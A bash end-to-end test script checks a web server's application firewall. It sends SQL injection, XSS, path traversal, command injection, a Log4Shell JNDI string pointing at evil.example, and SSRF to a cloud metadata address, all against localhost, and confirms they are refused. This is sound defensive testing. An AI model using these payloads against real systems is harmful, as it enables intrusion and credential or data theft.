#!/usr/bin/env bash
# The web application firewall against the rws binary with curl: attacks in
# the query, a form body, JSON, a cookie and headers are refused with 403
# problem+json naming the rule; ordinary requests pass; a custom deny rule,
# an exclusion and detect mode behave; rws_waf_* metrics count.
#
#   ci/e2e/waf.sh <path-to-rws>
set -euo pipefail

RWS="$(cd "$(dirname "$1")" && pwd)/$(basename "$1")"
WORK="$(mktemp -d)"
PIDS=()
cleanup() {
  for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null || true; done
  wait 2>/dev/null || true
  rm -rf "$WORK"
}
trap cleanup EXIT
fail() { echo "FAIL: $*"; tail -20 "$WORK"/rws*.log 2>/dev/null || true; exit 1; }
pass() { echo "ok: $*"; }
cd "$WORK"
mkdir www && echo home > www/index.html

cat > rws.config.toml <<'TOML'
port = 18551

[middleware.waf]
exclude = ["941*@/cms/"]
[[middleware.waf.rule]]
id = 1001
field = "path"
prefix = ["/wp-login.php", "/xmlrpc.php"]

# A route for the API; everything else falls through to the built-in
# server (static files, /metrics) — [middleware.waf] covers both.
[[route]]
name = "api"
[route.match]
path = "/api/*"
[route.action]
type = "respond"
status = 200
body = "api"
TOML
"$RWS" --check=rws.config.toml >check.log 2>&1 || fail "rws --check: $(cat check.log)"
(cd www && exec env RWS_CONFIG_FILE=../rws.config.toml "$RWS" >../rws.log 2>&1) & PIDS+=($!)
for _ in $(seq 1 100); do curl -s -o /dev/null http://127.0.0.1:18551/ && break; sleep 0.1; done

code() { curl -s -o /dev/null -w '%{http_code}' "$@"; }
passes() { local c; c=$(code "$@"); [ "$c" != 403 ] || return 1; }
refused() { # <rule> <curl args…>
  local rule=$1; shift
  local out; out=$(curl -s -w '\n%{http_code}' "$@")
  [ "$(tail -1 <<<"$out")" = 403 ] || fail "not refused: $* → $out"
  grep -q "$rule" <<<"$out" || fail "the refusal doesn't name rule $rule: $out"
}
refused 942100 "http://127.0.0.1:18551/search?q=%27%20or%20%271%27%3D%271"
refused 941110 "http://127.0.0.1:18551/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
refused 930100 "http://127.0.0.1:18551/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
refused 932100 "http://127.0.0.1:18551/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"
refused 942110 -d "user=admin'--&pass=x" http://127.0.0.1:18551/login
refused 941100 -H 'Content-Type: application/json' -d '{"comment":"<script>alert(1)</script>"}' http://127.0.0.1:18551/api/comments
refused 941110 -H 'Cookie: pref=<svg/onload=alert(1)>' http://127.0.0.1:18551/
refused 944100 -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' http://127.0.0.1:18551/
refused 913100 -A 'sqlmap/1.7.2#stable (https://sqlmap.org)' http://127.0.0.1:18551/
refused 934100 "http://127.0.0.1:18551/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
[ "$(curl -s -o /dev/null -w '%{content_type}' "http://127.0.0.1:18551/?q=%3Cscript%3E")" = "application/problem+json" ] || fail "not problem+json"
pass "SQLi, XSS, traversal, command injection in query, form, JSON, cookie, headers, scanner, SSRF: refused with the rule named"

for q in "O%27Reilly" "red+running+shoes" "a%3Db" "Tom+%26+Jerry" "price+%3E%3D+10"; do
  [ "$(code "http://127.0.0.1:18551/api/search?q=$q")" = 200 ] || fail "an ordinary query was refused: $q"
done
[ "$(code "http://127.0.0.1:18551/?utm_source=newsletter&utm_campaign=fall")" = 200 ] || fail "the home page was refused"
[ "$(code -d 'name=Ann&comment=Great+product%2C+would+buy+again%21' http://127.0.0.1:18551/api/reviews)" = 200 ] || fail "an ordinary form was refused"
[ "$(code -H 'Content-Type: application/json' -d '{"name":"Ann","tags":["a","b"],"n":1}' http://127.0.0.1:18551/api/items)" = 200 ] || fail "ordinary JSON was refused"
pass "ordinary queries, forms and JSON pass"

[ "$(code http://127.0.0.1:18551/wp-login.php)" = 403 ] || fail "the custom deny rule didn't apply"
passes "http://127.0.0.1:18551/cms/save?html=%3Cscript%3Ex%3C%2Fscript%3E" || fail "the exclusion for /cms/ didn't apply"
pass "custom deny rule and an exclusion"

metrics=$(curl -s http://127.0.0.1:18551/metrics)
grep -q 'rws_waf_requests_total{action="blocked"}' <<<"$metrics" && grep -q 'rws_waf_rule_matches_total{rule="942100"}' <<<"$metrics" || fail "no rws_waf metrics"
grep -q '\[waf\] blocked' rws.log || fail "blocks aren't logged"
pass "metrics and log lines"

kill "${PIDS[-1]}"; wait "${PIDS[-1]}" 2>/dev/null || true
sed -i 's/^\[middleware.waf\]$/[middleware.waf]\nmode = "detect"/' rws.config.toml
(cd www && exec env RWS_CONFIG_FILE=../rws.config.toml "$RWS" >../rws-detect.log 2>&1) & PIDS+=($!)
for _ in $(seq 1 100); do curl -s -o /dev/null http://127.0.0.1:18551/ && break; sleep 0.1; done
[ "$(code "http://127.0.0.1:18551/api/x?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")" = 200 ] || fail "detect mode refused a request"
grep -q '\[waf\] detected' rws-detect.log || fail "detect mode didn't log"
pass "detect mode logs and lets requests through"

echo "all WAF end-to-end checks passed"
